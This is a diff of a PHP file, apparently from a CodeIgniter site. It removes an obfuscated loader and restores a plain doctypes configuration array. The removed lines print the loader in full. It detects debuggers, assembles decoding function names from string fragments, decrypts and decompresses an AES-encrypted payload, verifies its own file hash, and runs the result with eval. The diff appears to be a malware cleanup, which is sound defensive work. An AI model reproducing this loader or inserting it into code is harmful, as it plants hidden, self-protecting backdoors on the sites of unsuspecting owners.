@@ -1,28 +1,24 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_qj6fwrs0=('bas'.'e64'.'_de'.'cod'.'e');
-$_e1094dk1=('gzu'.'nco'.'mpr'.'ess');
-$_ldl2sanh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_duq25a1m='6pmeA4oS';
-$_ai0ub1u2='NxsCfXa6';
-$_uwahzlfs='bTDOZlT1';
-$_v4jeqlix='0Q68wm2v';
-$_u7q3w15m='v3pGSPW+14U=';
-$_jq1clmst='C/7fJQ==';
-$_i3did6h0='cdkfqWvT';
-$_gis4skv0='SGGhsgLg';
-$_e29q4u1h=$_qj6fwrs0($_uwahzlfs.$_duq25a1m.$_ai0ub1u2.$_v4jeqlix.$_u7q3w15m);
-$_gkjif6wg=$_qj6fwrs0($_gis4skv0.$_i3did6h0.$_jq1clmst);
-$_wys26zxc=$_qj6fwrs0('MM11GxFDRzF5QmXxDttgjTiZSvgsFX0Gu0FAaomFsyZzAR7ZGo1uEyhcHBJvDiF5DMnPFeB+AcsXQRI1Yd/lu8v3sCdYTZasQUD+3b3lfH5T8w0j47Inj/Md+jt1Gh2BD0RiQ+z152xHDVHGQBCl0YdTatR6vpZ5ShjlFeOL+01j3K7EH1ETdvfskTx85/CSijTpNtJAX+Gubdx3RHNW5gxVN/LeSQkWS7DC2qgfi8Voa/hEO9q+GsX6D0XG/EKkkozlvmLNjvp0PyAE34Fud36ZhpQB1Bs8JeXVapYuUIUMqmQKuFfGLiycf0FDmeYXDPux0QAfZWn9VWz4xgNKvyp9qiVRplTduvdrIp1rQgTduN1NF3DkRpD3+HAwB4YNWC9yM79k5R8M5RWXZL8YkAkyD62Kqm7bxl6Ge3UFhkLdjpd0SqsEOI+s7qVeB/PJS0FW9M7LucsbpxUJRYW0tkZDPOFQzAoXZYS30HDB4DcjnVOkkBJtOzynCePUK9X/DAbcLT0NT+E+hd96BM+TRpxqIalr1Eoe7sgr6uPDsMIp5qypsQwtm1PtlitimK2g16VyhVCOQPEO2++R/KAiyvy3Kqn1LJ63R19d0D+8K7X5+giefe9LTELR0sPqTD2nm+y0x0CH506abjfU+VFA/WK1UKTRVudv+uD2rHQ64SHYOSBdavf2wrKfnNFGSeQrzGpXXGaYGNpVSwA6TjER1w==');
-$_r4mkf0o0=$_ldl2sanh($_wys26zxc,'aes-256-cbc',$_e29q4u1h,OPENSSL_RAW_DATA,$_gkjif6wg);
-if($_r4mkf0o0===false){exit;}
-$_kru83zmi=$_e1094dk1($_r4mkf0o0);
-if($_kru83zmi===false){exit;}
-$_wr1karrt='75145526e97462bcb846ca58612090733a5d07a2a24b50b6c7f56976ad96c4b1';
-$_j9hybyjl=@file_get_contents(__FILE__);
-if($_j9hybyjl!==false){
-$_xda8uuv1=str_replace($_wr1karrt,"0000000000000000000000000000000000000000000000000000000000000000",$_j9hybyjl);
-$_tx2wnlbd=hash("sha256",$_xda8uuv1);
-if($_tx2wnlbd!==$_wr1karrt){@http_response_code(403);exit;}
-}
-eval($_kru83zmi);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+$_doctypes = array(
+'xhtml11' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">',
+'xhtml1-strict' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+'xhtml1-trans' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',
+'xhtml1-frame' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd">',
+'xhtml-basic11' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">',
+'html5' => '<!DOCTYPE html>',
+'html4-strict' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">',
+'html4-trans' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">',
+'html4-frame' => '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">',
+'mathml1' => '<!DOCTYPE math SYSTEM "http://www.w3.org/Math/DTD/mathml1/mathml.dtd">',
+'mathml2' => '<!DOCTYPE math PUBLIC "-//W3C//DTD MathML 2.0//EN" "http://www.w3.org/Math/DTD/mathml2/mathml2.dtd">',
+'svg10' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">',
+'svg11' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
+'svg11-basic' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Basic//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-basic.dtd">',
+'svg11-tiny' => '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">',
+'xhtml-math-svg-xh' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN" "http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg.dtd">',
+'xhtml-math-svg-sh' => '<!DOCTYPE svg:svg PUBLIC "-//W3C//DTD XHTML 1.1 plus MathML 2.0 plus SVG 1.1//EN" "http://www.w3.org/2002/04/xhtml-math-svg/xhtml-math-svg.dtd">',
+'xhtml-rdfa-1' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.0//EN" "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-1.dtd">',
+'xhtml-rdfa-2' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML+RDFa 1.1//EN" "http://www.w3.org/MarkUp/DTD/xhtml-rdfa-2.dtd">'
+);
